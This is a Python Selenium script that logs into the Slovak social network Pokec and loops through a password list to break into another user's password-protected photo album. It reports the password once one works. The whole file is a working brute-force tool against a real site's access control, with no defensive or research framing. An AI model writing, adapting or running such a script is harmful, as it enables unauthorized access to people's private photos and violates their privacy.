#v0.1 

import config
import read_passwords

from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import NoSuchElementException


album_link = "https://pokec.azet.sk/" + config.user + "/fotoalbumy/" + config.album
pass_timeout = 1

max_number_pass = len(read_passwords.album_passwords)
number_attempts = 0


def check_loaded_page():
    # wait for the main page to load - check if Pomoc a podpora is loaded
    WebDriverWait(browser, 20).until(
        EC.presence_of_all_elements_located((By.XPATH, '//*[@class="wI9"]')))


options = webdriver.ChromeOptions()

s = Service(config.chrome_driver_path)
browser = webdriver.Chrome(service=s, options= options)

# load main web page
browser.get("https://pokec.azet.sk")

# accept privacy statement
browser.find_element(By.CLASS_NAME, "fc-button-label").click()

# enter username + pass
browser.find_element(By.XPATH, '//*[@class="Input-sc-1vv8hqf-0 HeaderLoginFormstyles__StyledInput-sc-1tqermr-6 iAjQwL gCOXow"]').send_keys(config.username)
browser.find_element(By.XPATH, '//*[@class="Input-sc-1vv8hqf-0 HeaderLoginFormstyles__PasswordInput-sc-1tqermr-7 iAjQwL hEuONx"]').send_keys(config.password)

# click submit button
browser.find_element(By.XPATH, '//*[@class="Button-sc-1fngo4c-0 HeaderLoginFormstyles__LoginButton-sc-1tqermr-4 ddPToY bZDNfj"]').click()
check_loaded_page()

for album_password in read_passwords.album_passwords:
    num = number_attempts + 1
    print(f"{num}/{max_number_pass} Trying password: {album_password}")

    # load web page album link
    browser.get(album_link)
    check_loaded_page()

    # enter album password
    try:
        browser.find_element(By.XPATH, '//*[@class="pokecUI-inputtext"]').send_keys(album_password)
        browser.find_element(By.XPATH, '//*[@class="PokecUI-text"]').click()
    except NoSuchElementException:
        print("Failed to locate password element, album is unlocked, nothing to do")
        quit()

    # wait for pass to be send
    browser.implicitly_wait(pass_timeout)

    # if class album-report is presented we found password so we need to break loop
    try:
        if browser.find_element(By.XPATH, '//*[@class="album-report"]'):
            number_attempts += 1
            break
    except NoSuchElementException:
        pass
    number_attempts+=1

if number_attempts == max_number_pass:
    print("No password found!")
else:
    print(f"I found password: {album_password} after: {number_attempts} attempts")





